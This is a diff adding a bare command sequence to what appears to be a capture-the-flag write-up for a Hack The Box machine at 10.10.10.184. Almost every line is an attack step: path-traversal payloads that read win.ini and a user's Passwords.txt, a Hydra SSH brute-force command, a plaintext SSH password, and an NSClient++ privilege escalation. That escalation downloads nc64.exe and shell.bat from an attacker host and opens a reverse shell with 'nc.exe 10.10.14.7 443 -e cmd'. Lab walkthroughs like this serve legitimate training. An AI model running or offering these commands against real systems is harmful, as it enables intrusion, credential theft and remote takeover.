@@ -1,5 +1,41 @@
 ```
 nmap -sS -sC -sV -T5 -Pn 10.10.10.184
+ftp 10.10.10.184
+anonymous:anonymous
+http://10.10.10.184
+nvms 1000 exploit
+https://www.exploit-db.com/exploits/48311
+http://10.10.10.184/Pages/login.htm
+/../../../../../../../../../../../../windows/win.ini
+/../../../../../../../../../../../../Users/Nathan/Desktop/Passwords.txt
+hydra -v -V -u -L users.txt -P passwords.txt -t 10 -u 10.10.10.184 ssh
+ssh Nadine@10.10.10.184
+Powershell
+whoami /priv
+searchsploit 'NSClient++'
+cmd /c "C:\Program Files\NSClient++\nscp.exe" --version
+https://www.exploit-db.com/exploits/46802
+cd "C:\Program Files\NSClient++\“
+sshpass -p 'L1k3B1gBut7s@W0rk' ssh nadine@10.10.10.184 -L 8443:127.0.0.1:8443
+https://127.0.0.1:8443
+\programdata\nc.exe 10.10.14.7 443 -e cmd
+cd C:\programdata\
+powershell wget http://10.10.14.7/nc64.exe -outfile nc.exe
+powershell wget http://10.10.14.7/shell.bat -outfile shell.bat
+/settings/external scripts/scripts/df
+Command
+C:\programdata\shell.bat
+/settings/scheduler/schedules/df_run
+Interval ; 10s
+Command ; df
+rlwrap nc -lnvp 443
+Trigger with Module - CheckExternalScripts
+```
+
+
+
+```
+nmap -sS -sC -sV -T5 -Pn 10.10.10.184
 ```
 ![image](https://github.com/user-attachments/assets/a313103a-0e86-4faa-8270-9879e148cc2e)
 
